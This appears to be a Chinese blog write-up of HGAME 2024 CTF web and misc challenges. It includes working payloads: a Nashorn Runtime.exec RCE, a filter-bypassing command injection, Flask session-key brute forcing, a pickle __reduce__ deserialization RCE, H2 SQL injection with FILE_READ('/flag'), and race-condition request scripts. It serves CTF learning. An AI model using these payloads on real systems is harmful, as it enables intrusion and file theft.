+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;noscriptmsg&quot;</span>&gt;</span></span><br><span class="line">     You don&#x27;t have javascript enabled. Good luck with that :)</span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>结合题目想到是不是和浏览器<code>JavaScript</code>的设置有关，一开始直接用BurpSuite代理去掉了所有JavaScript，发现好像直接啥都没了······</p>
+<p>然后搜索引擎了一下，<code>enabled javascript绕过登录</code>，发现<code>CVE-2021-43703</code> <del>西电合理</del></p>
+<p>根据CVE复现的说明在浏览器<code>about:config</code>将<code>javascript.enabled</code>的值设置为<code>false</code>，成功绕过了验证，可以访问<code>/index.html</code>不会被跳转</p>
+<p>但是之后卡了一下，因为没有什么flag的踪迹。想到之前使用<code>register</code>的时候也是被弹走的，现在也是可以正常使用，所以注册了一下就登进去了，然后就愉快地出flag了（看来都是前端JavaScript的校验，不是很安全~）</p>
+<h4 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select Courses</h4><p>一开始想了很多啊感觉flag会不会是在<code>.js</code>里面什么的，能不能用修改response报文的方法来欺骗前端获得flag，但是看了看逻辑发现不可能，还花一大堆时间找有没有修改服务器数据的方法，注入什么的，看了一眼<code>Werkzeug/3.0.1</code>刚修了个洞，所以估计不是这个方向……</p>
+<p>最后返璞归真，原因是每次开靶机发发POST总是能莫名其妙把创业课选上……所以大概是要搓个抢课脚本吧（最实用主义的一集，难绷）</p>
+<p>把之前写过的python脚本拿过来爆改成最简单暴力的版本，2000次不到就蹲课成功了 <del>因为是挂着实际上可能用不了这么久</del> ，高效啊高效。抢完了点一下就可以<code>tellAgu</code>了<del>发报文也行就是说</del></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    url_get = <span class="string">&quot;http://47.100.137.175:30001/api/courses&quot;</span></span><br><span class="line">    header = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,<span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;8&quot;</span>,</span><br><span class="line">              <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.100.137.175:30001&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.100.137.175:30001/&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">   	<span class="comment"># 课程 这么设置是之前那个脚本的逻辑......</span></span><br><span class="line">    json1 = &#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>&#125;</span><br><span class="line">    json2 = &#123;<span class="string">&quot;id&quot;</span>: <span class="number">2</span>&#125;</span><br><span class="line">    json3 = &#123;<span class="string">&quot;id&quot;</span>: <span class="number">3</span>&#125;</span><br><span class="line">    json4 = &#123;<span class="string">&quot;id&quot;</span>: <span class="number">4</span>&#125;</span><br><span class="line">    json5 = &#123;<span class="string">&quot;id&quot;</span>: <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        res1 = requests.post(url=url_get, headers=header, json=json1).text</span><br><span class="line">        res2 = requests.post(url=url_get, headers=header, json=json2).text</span><br><span class="line">        res3 = requests.post(url=url_get, headers=header, json=json3).text</span><br><span class="line">        res4 = requests.post(url=url_get, headers=header, json=json4).text</span><br><span class="line">        res5 = requests.post(url=url_get, headers=header, json=json5).text</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(cnt)	<span class="comment">#没回显没安全感，谁懂</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h4><p>这题主要是容易被2048作弊方法误导 <del>做了几次<code>.js</code>里面藏flag的，每次都是试图正面解决然后被狠狠教育555</del></p>
+<p>观察了一下，是前端的JavaScript小游戏，所以flag应该是前端生成的。</p>
+<p>没法直接按F12，但是也就是多点两下就能把开发者工具调出来了</p>
+<p>尝试的方法有 <del>真好玩</del> 找储存更改<code>localStorage</code>和<code>sessionStorage</code>数值，但是都没用（毕竟存在<code>fakeStorage</code>里)</p>
+<p>但是光改<code>fakeStorage</code>只对显示有帮助，好像没办法弹flag（大概）</p>
+<p>用关键字搜索<code>won</code> <del>其实是浏览瞪眼法</del> 发现可疑字符串</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240130215555928.png"
+                      alt="halfF"
+                ></p>
+<p>但是这个<code>.js</code>一看就是混淆过的。</p>
+<p>找了一下JavaScript混淆方面的信息，觉得大概是ob混淆，所以找了个脚本 <code>decodeObfuscator</code></p>
+<p>但是直接逆会说格式不符合，所以就先丢到ob里面用<code>low</code>模式二次处理，再用脚本去混淆化</p>
+<p>研究了一下逻辑，<code>F()</code>应该就是字符串替换函数 （*我这里跑出来是<code>n()</code>变成了<code>F()</code>*） 然后</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">F</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> $(a-<span class="number">417</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">$</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> _0x4e76c2 = <span class="comment">/*略*/</span> ;</span><br><span class="line"></span><br><span class="line">  $ = <span class="keyword">function</span> (<span class="params"></span>) &#123;        <span class="comment">//重定义，返回对应的数组中的字符串；可以直接对照浏览器源码中查到的 $ 函数里的数组 x</span></span><br><span class="line">    <span class="keyword">return</span> _0x4e76c2;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> $();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个<code>s0()</code>一脸用来解码的样子，把值替换做一下，再单独拎出来就能把flag爆出来了</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">s0</span>(<span class="params">_0x4e304a, _0x3b8d69</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _0x24dd5e = <span class="number">0</span>, _0x47aebc, _0x166f6c, _0x26bec7 = <span class="number">0</span>, _0x51fd24 = <span class="string">&#x27;&#x27;</span>; _0x166f6c = _0x4e304a[<span class="string">&quot;charAt&quot;</span>](_0x26bec7++); ~_0x166f6c &amp;&amp; (_0x47aebc = _0x24dd5e % <span class="number">4</span> ? _0x47aebc * <span class="number">64</span> + _0x166f6c : _0x166f6c, _0x24dd5e++ % <span class="number">4</span>) ? _0x51fd24 += <span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="number">255</span> &amp; _0x47aebc &gt;&gt; (-<span class="number">2</span> * _0x24dd5e &amp; <span class="number">6</span>)) : <span class="number">0</span>) &#123;</span><br><span class="line">      _0x166f6c = _0x3b8d69[<span class="string">&quot;indexOf&quot;</span>](_0x166f6c);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> _0x51fd24;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">s0</span>(<span class="string">&quot;I7R8ITMCnzbCn5eFIC=6yliXfzN=I5NMnz0XIC==yzycysi70ci7y7iK&quot;</span>,<span class="string">&#x27;V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=QcTq6JkWK4t3&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="Jhat"><a href="#Jhat" class="headerlink" title="Jhat"></a>Jhat</h4><blockquote>
+<p>这题分析如果有错的话还请轻喷&#x2F;(ㄒoㄒ)&#x2F;~~，欢迎拷打不懂很多的我( ‘◡’ )</p>
+</blockquote>
+<p>通过网页可以看到类信息，结合附件<code>dockerfile</code>（应该就是靶机环境）可知靶机应该就只是用jhat对<code>heapdump.hprof</code>进行了解析</p>
+<p>所以看来看去能打打看的也就只有那个OQL数据库了  <em>后来也给hint了</em></p>
+<p>一开始觉得会不会是把flag明文写在哪个class的值里了，但是试了好久，查询出来不是报错就是空白 <del>第一次接触OQL全是报错</del></p>
+<p>然后发现报错里面有Java反射，想会不会是用反射进行RCE  <em>想到可能是RCE的时候发现给hint了；事实证明RCE的实现和反射不太有关，但是回显貌似是有关的？</em></p>
+<p>RCE嘛那应该就是读文件里的flag，<code>dockerfile</code>中显示将<code>/data</code> copy到了根目录，所以应该要读的就是<code>/flag</code></p>
+<p>通过报错发现用了<code>NashornEngine</code>，可以执行Java语句</p>
+<p>翻到有一篇十年前的OQL RCE文章，用经典语句试了一下</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">java.<span class="property">lang</span>.<span class="property">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>回显了<code>java.lang.UNIXProcess@xxxxxxxx</code>，了解了一下应该是<code>Process</code>对象的默认字符串表示形式，在执行子进程时会返回<code>Process</code>对象，输出这个对象的时候调用了默认的<code>toString()</code>，所以这个点应该是有效的，所以问题的关键就变成了如何将这个进程的结果回显出来</p>
+<p><del>然后就这么愉快地卡住了</del></p>
+<p>尝试了很多，翻到别的OQL有反射洞，但是利用不了。然后想着应该是可以用报错的方式把文件内容抛出来，最后也是成功了</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在gpt的帮助下整出来了第一版exp</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">BufferedReader</span> = java.<span class="property">io</span>.<span class="property">BufferedReader</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">InputStreamReader</span> = java.<span class="property">io</span>.<span class="property">InputStreamReader</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> process = java.<span class="property">lang</span>.<span class="property">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> inputStream = process.<span class="title function_">getInputStream</span>();</span><br><span class="line">    <span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> line;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">new</span> java.<span class="property">lang</span>.<span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((line = reader.<span class="title function_">readLine</span>()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        result.<span class="title function_">append</span>(line).<span class="title function_">append</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//这里有一个可有可无的toString()转换</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> javax.<span class="property">script</span>.<span class="title class_">ScriptException</span>(<span class="string">&quot;File content: &quot;</span> + fileContent);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> javax.<span class="property">script</span>.<span class="title class_">ScriptException</span>(<span class="string">&quot;File content: &quot;</span> + fileContent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Caused by: &lt;eval&gt;:22:3 javax.script.ScriptException: File content: hgame&#123;&#125; 会这样抛出flag</span></span><br></pre></td></tr></table></figure></div>
+
+<p>然后想看看有没有其他方法，或者说是怎么做到的（？）</p>
+<p>修改了一下发现应该是如果有<code>String</code>类的时候会被读取且只显示最后一个 <em>可能是利用反射，还是不清楚实现方式</em></p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//然后自己弄出了另一种回显，类似于查询之后的显示</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">BufferedReader</span> = java.<span class="property">io</span>.<span class="property">BufferedReader</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">InputStreamReader</span> = java.<span class="property">io</span>.<span class="property">InputStreamReader</span>;</span><br><span class="line"><span class="keyword">var</span> process = java.<span class="property">lang</span>.<span class="property">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> inputStream = process.<span class="title function_">getInputStream</span>();</span><br><span class="line"><span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line"><span class="keyword">var</span> line;</span><br><span class="line"><span class="keyword">var</span> result = <span class="keyword">new</span> java.<span class="property">lang</span>.<span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((line = reader.<span class="title function_">readLine</span>()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        result.<span class="title function_">append</span>(line);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里有一个可有可无的toString()转换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//只显示flag内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//但是如果在后面有其他字符串就被顶成新的字符串了</span></span><br><span class="line"><span class="keyword">new</span> java.<span class="property">lang</span>.<span class="title class_">String</span>(<span class="string">&quot;kira&quot;</span>);</span><br><span class="line"><span class="comment">//只显示&quot;kira&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>所以猜测可能是和OQL查询class时的联动，由此也可以解释为什么上面直接用<code>java.lang.Runtime.getRuntime().exec(&#39;cat /flag&#39;)</code>会显示<code>Process</code>对象的默认字符串表示形式</p>
+<p><del>蒽，卡这么久是因为我Java和JavaScript都不懂，在学了在学了www</del></p>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h4><p><del>谁家小孩把这题当签到题的555</del></p>
+<p>收到文件发现是个形变过后的图片，找了个<a class="link"   href="https://photokit.com/editor/?lang=zh" >在线图片编辑器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，里面<code>变形</code>的<code>PERSPECTIVE</code>功能拉一拉就能看出来了</p>
+<h4 id="来自星尘的问候"><a href="#来自星尘的问候" class="headerlink" title="来自星尘的问候"></a>来自星尘的问候</h4><p>提到六位弱加密，用<code>steghide extract -sf secret.jpg</code>跑了一下，出来了<code>secret.zip</code>，里面是星尘文（？）图片和一个文字预览脚本</p>
+<p>额<code>123456</code>是猜的……但是貌似也可以配合<code>steghide</code>爆破，去学学</p>
+<p>搜索了一下，拿到了<code>.ttf</code>文件，安装文字之后在word文档里对出来的……从官网F12可以拿到<code>.wolf2</code>的字体文件，但是直接用转好的<code>.ttf</code>更方便 <del>果然还得是厨力</del></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/60e9f442c72088a31796df88509bb83d.png"
+                      alt="stardust"
+                ></p>
+<p><del>试了一下，要上传<code>.ttf</code>，我觉得这个脚本是出题的时候生成图片以后觉得可能做题也用的上然后一起打进来的</del>  不过确实比敲word+扳手指好多了……</p>
+<h4 id="simple-attack"><a href="#simple-attack" class="headerlink" title="simple_attack"></a>simple_attack</h4><p>看到要解压缩包，搜索了可能的方法。外面的图片和压缩包里面的图片<code>CRC-32</code>和大小是一样的，应该是同一个文件，所以可以用明文爆破的方法。</p>
+<p>先将外面的图片压缩成<code>.zip</code>文件再用<code>ARCHPR</code>进行明文爆破</p>
+<p>虽然是这么简单的一句话，但是实际上因为不同软件和压缩度的不同，会导致报错，一个一个试过去真的很折磨（压缩软件喜加二）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/64d84cbb12012dc270e9017d3714e9b4.png"
+                      alt="ZipAttack"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/0af07318c386b21006627c3f3e8e5a3d.png"
+                      alt="BandizipCon"
+                ></p>
+<p>最后出结果的是Bandizip的2-正常压缩  <del>招新群提过Bandizip，收束了</del></p>
+<p>解压出来文件头上是<code>data:image/png;base64,</code>，之前没了解过，感觉像是图片编码后的结果，然后查到是<code>DATA URI</code>。把之前的文本内容包在<code>&lt;img src=&quot;data:image/png;base64,...&quot; /&gt;</code>里面然后改成<code>.html</code>文件打开就能看到flag了</p>
+<h4 id="希儿希儿希尔"><a href="#希儿希儿希尔" class="headerlink" title="希儿希儿希尔"></a>希儿希儿希尔</h4><p>首先这个样子肯定是宽高被改了，用脚本爆破修改<del>梭出来</del>就好了</p>
+<p><del>彼岸双生，好欸！没有双子但是有专武，虽然很久很久不玩三蹦子了</del></p>
+<p>修复一下没有明显信息，用<code>binwalk</code>可以分出<code>secret.txt</code>里面是一串大写字母，简介说最后出来的是一串大写字母，所以应该是还有一层加密</p>
+<p>通过题目<code>希儿希儿希尔</code>可以知道这题是希尔密码 <del>希儿和希尔不是一样的吗</del> ，开始找密钥</p>
+<p><del>唉，希儿厨做不出希儿题，唉，找不到思密达</del></p>
+<p>铸币啊铸币，忘记检查LSB隐写了，一丢<code>stegsolve</code>密钥和转换值就出来了，唉……</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240131071322112.png"
+                      alt="solve_seele"
+                ></p>
+<p>然后就是希尔密码解密把flag解出来了</p>
+<h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h3><h4 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a>What the cow say?</h4><p>先随便输点东西，发现有回显，并且过滤掉了一些关键字符<code>\</code> <code>flag</code> <code>cat</code>，所以应该是绕过进行命令注入，和MINI那道<code>Figlet</code>差不多<del>想起被拷打命令注入和RCE的区别</del></p>
+<p>这道题关键是要用<code>ls</code>把<code>flag</code>所在目录和具体文件名找出来，毕竟不是经典的<code>/flag</code></p>
+<p>然后反引号命令替换也是常用的了</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp</span></span><br><span class="line">`ca<span class="string">&#x27;&#x27;</span>t<span class="variable">$IFS</span>/fl<span class="string">&#x27;&#x27;</span>ag_i<span class="string">&#x27;&#x27;</span>s_he<span class="string">&#x27;&#x27;</span>re/fl<span class="string">&#x27;&#x27;</span>ag_c0w<span class="string">&#x27;&#x27;</span>54y`</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a>myflask</h4><p>访问靶机可以看到直接返回了<code>app.py</code>，<del>好多提示</del></p>
+<p>看到需要用户验证，以<code>admin</code>身份登录，逻辑是检验<code>session：username</code>，所以先要进行Flask Session伪造，关键是找到<code>SECRET_KEY</code>，上面写到是<code>currentTime</code>，然后找了个脚本修改一下用遍历把<code>currentTime</code>强行解出来了</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABC</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">        app = MockApp(secret_key)</span><br><span class="line">        si = SecureCookieSessionInterface()</span><br><span class="line">        s = si.get_signing_serializer(app)</span><br><span class="line">        <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie_value = <span class="string">&quot;eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZcDsyQ.iImCCeKDG6KYGVXhzMej4p2YqTk&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> secret_key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">000000</span>, <span class="number">240000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_value = FSCM.decode(cookie_value, <span class="built_in">str</span>(secret_key))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Decoded with secret_key <span class="subst">&#123;secret_key&#125;</span>: <span class="subst">&#123;decoded_value&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div>
+
+<p>不过<code>currentTime</code>应该就是靶机生成的时间，所以拿那个时间段试试应该就行</p>
+<p>然后用上<code>SECRET_KEY</code>把修改过后的session原文<code>&#123;&#39;username&#39;: &#39;admin&#39;&#125;</code>加密一下放在cookie里就行了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240206174833034.png"
+                      alt="resession"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240206174936102.png"
+                      alt="burpsuite0"
+                ></p>
+<p>下一步是<code>RCE</code>，看到这有个<code>pickle.load()</code>查了一下是反序列化RCE，找了个可以用的exp，利用<code>__reduce__</code>将内容在序列化时不保存在字符串内，然后反序列化时读取本地内容</p>
+<p>因为<code>pickle序列化</code>涉及底层操作要在UNIX系统编译执行exp，不然在RCE会出错</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rce</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.check_output, ([<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>],))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = Rce()</span><br><span class="line">serialized_data = pickle.dumps(a)</span><br><span class="line">base64_str = base64.b64encode(serialized_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64_str)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240206175840568.png"
+                      alt="pickle"
+                ></p>
+<p>要补一补这方面的知识 <del>todo+1</del></p>
+<h4 id="search4member"><a href="#search4member" class="headerlink" title="search4member"></a>search4member</h4><p>东西给了很多，给了数据库，看代码有sqli</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">String <span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM member WHERE intro LIKE &#x27;%&quot; <span class="operator">+</span> keyword <span class="operator">+</span> &quot;%&#x27;;&quot;;</span><br></pre></td></tr></table></figure></div>
+
+<p>靶机数据库内的信息和给的<code>init.sql</code>里面的一致，查了查发现框架里的<code>h2database</code>有可以利用的函数，整体流程和一般的sqli基本一致，union+order</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># exp:</span><br><span class="line"><span class="number">1111</span><span class="string">&#x27; UNION SELECT FILE_READ(&#x27;</span><span class="operator">/</span>flag<span class="string">&#x27;,NULL),null,null OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/af9a7597301be96b21bd2fe01e68e598_720.png"
+                      alt="af9a7597301be96b21bd2fe01e68e598_720"
+                ></p>
+<h4 id="Select-More-Courses"><a href="#Select-More-Courses" class="headerlink" title="Select More Courses"></a>Select More Courses</h4><p>一开始卡住了，看到有提示是弱密码试图爆破，但是没爆出来，用了hint的字典爆出来了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240208173119617.png"
+                      alt="hintdic"
+                ></p>
+<p>然后进入选课界面，要先扩学分，提示是<code>race against time</code>，所以改了改选课脚本进行多并发尝试</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 这里设置一下几个接口</span></span><br><span class="line">    url_sign = <span class="string">&quot;http://106.14.57.14:30448/api/auth/login&quot;</span></span><br><span class="line">    url_expand0 = <span class="string">&quot;http://106.14.57.14:30448/expand&quot;</span></span><br><span class="line">    url_expand = <span class="string">&quot;http://106.14.57.14:30448/api/expand&quot;</span></span><br><span class="line">    url_select = <span class="string">&quot;http://106.14.57.14:30448/api/select&quot;</span></span><br><span class="line"></span><br><span class="line">    header = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">              <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://106.14.57.14:30448&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://106.14.57.14:30448&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    json1 = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;ma5hr00m&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;qwert123&quot;</span>&#125;</span><br><span class="line">    json2 = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;ma5hr00m&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    res1 = requests.post(url=url_sign, headers=header, json=json1)</span><br><span class="line">    cookie = res1.cookies</span><br><span class="line">    cookie_dict = requests.utils.dict_from_cookiejar(cookie)</span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.100.137.175:30001&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.100.137.175:30001/&quot;</span>,</span><br><span class="line">               <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;; &#x27;</span>.join([<span class="string">f&#x27;<span class="subst">&#123;key&#125;</span>=<span class="subst">&#123;value&#125;</span>&#x27;</span> <span class="keyword">for</span> key, value <span class="keyword">in</span> cookie_dict.items()])&#125;</span><br><span class="line">    <span class="built_in">print</span>(headers)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res02 = requests.get(url=url_expand0,headers=headers)</span><br><span class="line">    res2 = requests.post(url=url_expand, headers=headers, json=json2).text</span><br><span class="line">    <span class="built_in">print</span>(res2)</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(cnt)</span><br></pre></td></tr></table></figure></div>
+
+<p>然后每隔一段时间就刷新一下选课界面，刷出来学分到38就能选上课 <code>Race Rondition</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240208173530670.png"
+                      alt="raceagainst"
+                ></p>
